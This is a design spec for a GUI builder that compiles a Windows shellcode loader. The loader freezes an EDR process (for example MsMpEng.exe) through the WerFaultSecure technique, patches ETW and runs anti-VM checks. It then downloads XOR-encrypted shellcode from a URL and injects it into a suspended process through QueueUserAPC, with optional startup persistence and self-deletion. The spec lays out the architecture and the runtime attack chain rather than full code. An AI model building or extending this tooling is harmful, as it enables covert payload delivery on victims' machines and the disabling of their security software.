# midnight_loader Design Spec

## Overview

A Windows desktop application built with Go + Wails that bundles a GUI builder for
the PandaLoader-style shellcode loader and integrates EDR-Freeze's WerFaultSecure
suspension technique. The operator fills out a form, clicks "Build", and gets a
ready-to-run `.exe` that first freezes the target EDR process, then injects the
shellcode.

Target audience: red team operators, security researchers. Educational use only.

---

## Architecture

```
midnight_loader/
├── main.go                    # wails entry point
├── app.go                     # wails App struct + bound methods
├── wails.json                 # wails project config
├── frontend/                  # svelte UI (wails default)
│   ├── src/
│   │   ├── App.svelte
│   │   ├── lib/
│   │   │   ├── BuilderForm.svelte   # main config form
│   │   │   ├── LogPanel.svelte      # streaming build log
│   │   │   └── StatusBadge.svelte
│   │   └── main.js
│   └── package.json
├── internal/
│   ├── builder/
│   │   ├── builder.go         # orchestrates compile pipeline
│   │   ├── crypto.go          # xor encrypt shellcode, keygen
│   │   └── template.go        # renders PandaLoader stub from template
│   ├── edrfreeze/
│   │   └── embed.go           # go:embed the EDR-Freeze .cpp helpers
│   └── config/
│       └── config.go          # BuildConfig struct (shared between ui and backend)
├── assets/
│   ├── PandaLoader.cpp.tmpl   # go text/template of the loader stub
│   ├── EDRFreeze.cpp.tmpl     # FreezeRun + helpers as includable template block
│   ├── PPLHelp.cpp            # embedded source
│   ├── ProcessMisc.cpp        # embedded source
│   └── obfusheader.h          # embedded obfuscation header
└── docs/
```

---

## Components

### 1. BuildConfig (internal/config/config.go)

Single source of truth passed between UI and Go backend via Wails bindings.

```go
type BuildConfig struct {
    ShellcodeURL    string `json:"shellcode_url"`
    XorKey          string `json:"xor_key"`          // auto-generated if blank
    InjectionTarget string `json:"injection_target"`  // e.g. C:\\Windows\\System32\\svchost.exe
    EDRProcessName  string `json:"edr_process_name"`  // process name to freeze, optional
    FreezeTimeMs    int    `json:"freeze_time_ms"`    // how long to freeze (ms)

    EnableAntiVM  bool `json:"enable_anti_vm"`
    EnableMelt    bool `json:"enable_melt"`
    EnableStartup bool `json:"enable_startup"`
    EnableAdmin   bool `json:"enable_admin"`
    SleepDelay    bool `json:"sleep_delay"`
    HideDirectory bool `json:"hide_directory"`

    OutputPath string `json:"output_path"`
}
```

### 2. Builder (internal/builder/builder.go)

Bound method `Build(config BuildConfig) error` on the Wails App. Pipeline:

1. Validate config (URL must start with http, injection_target must end with .exe)
2. Generate random XOR key if blank via `crypto.GenerateKey()`
3. Extract embedded assets (obfusheader.h, PPLHelp.cpp, ProcessMisc.cpp) to temp dir
4. Render `PandaLoader.cpp.tmpl` into the temp dir using `text/template`
5. Compile with MinGW-w64 `g++` (must be on PATH): same flags as original builder.py
6. Stream build log lines via Wails `EventsEmit("build:log", line)` as they stream from g++ stderr/stdout
7. On success, copy the `.exe` to `config.OutputPath`

### 3. Crypto (internal/builder/crypto.go)

```go
func GenerateKey() string          // 12 random bytes -> base64 stripped of +/=
func XOREncrypt(data []byte, key string) []byte
```

Exposed as a bound Wails method `GenerateKey() string` and
`EncryptFile(inputPath, outputPath, key string) error` for the "Encrypt Shellcode"
button in the UI.

### 4. Template (internal/builder/template.go)

```go
func RenderStub(cfg config.BuildConfig, outDir string) (string, error)
```

Reads `assets/PandaLoader.cpp.tmpl`, executes `text/template` with `cfg`, writes
`<outDir>/loader.cpp`. Template mirrors `PandaLoader.cpp` with all `#define` values
replaced by Go template expressions.

EDR-Freeze integration in the template: `FreezeEDR()` is called right before
`payloadurl()` in `WinMain`. The function:

- Finds `edr_process_name` PID via `CreateToolhelp32Snapshot`
- Gets the main thread ID via `GetMainThreadId()`
- Calls `FreezeRun(pid, tid, freeze_time_ms)` -- EDR-Freeze logic inlined

Full `FreezeRun()`, `PauseCheck()`, and all helpers from `EDR-Freeze.cpp` and
`ProcessMisc.cpp` are inlined at the top of the template, inside
`{{ if .EDRProcessName }} ... {{ end }}`. If `EDRProcessName` is empty the entire
freeze block is compiled out.

### 5. Wails App (app.go)

```go
type App struct{ ctx context.Context }

func (a *App) Build(cfg config.BuildConfig) error
func (a *App) GenerateKey() string
func (a *App) EncryptFile(input, output, key string) error
func (a *App) CheckDeps() map[string]bool    // checks g++ on PATH
func (a *App) PickFile(filter string) string // wraps runtime.OpenFileDialog
func (a *App) PickDir() string
```

### 6. Frontend (frontend/src/)

`BuilderForm.svelte` fields:
- Shellcode URL (text, validated http*)
- Injection target (text, full path, .exe required)
- EDR process name (text, optional -- e.g. `MsMpEng.exe`)
- Freeze duration ms (number, shown only when EDR field is non-empty)
- XOR Key (text + "Generate" button)
- Feature toggles: Anti-VM, Melt, Startup, Admin, Sleep Delay, Hide Directory
- Output path (browse button -> `App.PickDir`)
- "Encrypt Shellcode" button -> file picker -> `App.EncryptFile`
- "Build" button -> `window.go.App.Build(config)`

`LogPanel.svelte`: listens on `EventsOn("build:log")`, appends lines to a scrollable
terminal-like div. Colors stderr red, stdout white.

`StatusBadge.svelte`: idle / building / success / error state derived from build events.

---

## Execution Flow

```
operator fills form
       │
       ▼
[Encrypt Shellcode] (optional, local XOR on .bin -> xor.bin via App.EncryptFile)
       │
       ▼
[Build]
  │  validate config
  │  generate xor key if empty
  │  extract assets to /tmp/mlbuild-<random>/
  │  render PandaLoader.cpp.tmpl -> /tmp/mlbuild-xxx/loader.cpp
  │  g++ compile -> loader.exe
  │  copy to OutputPath
  └─ stream each step to LogPanel via EventsEmit("build:log", msg)
       │
       ▼
operator deploys loader.exe on target

loader.exe runtime (on target):
  1. junk_code()
  2. ETWPATCH()
  3. mutex check (SINGLE_INSTANCE)
  4. AntiVM() [if ENABLE_ANTIVM]
  5. sleep delay [if SLEEP_DELAY]
  6. FreezeEDR(edr_process_name, freeze_time_ms)  <-- EDR-Freeze block
  7. payloadurl() -> download xor shellcode
  8. XORDecrypt()
  9. CreateProcess(InjectionTarget, CREATE_SUSPENDED)
 10. VirtualAllocEx + WriteProcessMemory
 11. VirtualProtect(PAGE_EXECUTE_READ)
 12. QueueUserAPC -> ResumeThread
 13. melt [if MELT]
```

---

## Tech Stack

- Go 1.22+ with Wails v2
- Svelte (Wails default frontend scaffold)
- MinGW-w64 `g++` on operator's PATH for compiling the stub
- `text/template` for stub rendering
- `go:embed` for bundling all C++ source assets
- Target stub: Windows x64

---

## Constraints

- Wails v2 stable
- g++ (MinGW-w64) must be on PATH at build time; `App.CheckDeps()` warns if missing
- Output loader is Windows x64 only (`-m64` implied by MinGW-w64 default)
- EDR-Freeze requires admin on the target (WerFaultSecure PPL creation needs SeDebugPrivilege)
- No network calls from the Wails app itself
- XOR key: alphanumeric only, 12-16 chars, compatible with obfusheader.h `OBF()` macro
- Freeze block is entirely absent from compiled stub when `EDRProcessName` is empty
- `obfusheader.h`, `PPLHelp.cpp`, `ProcessMisc.cpp` are embedded at compile time via `go:embed`

---

## Out of Scope

- In-app shellcode hosting / upload
- Persistence uninstaller UI (out of scope for v1; the template can still generate one as a file)
- Code signing the output `.exe`
- Linux/macOS cross-compilation of the stub
- Wails v3 migration
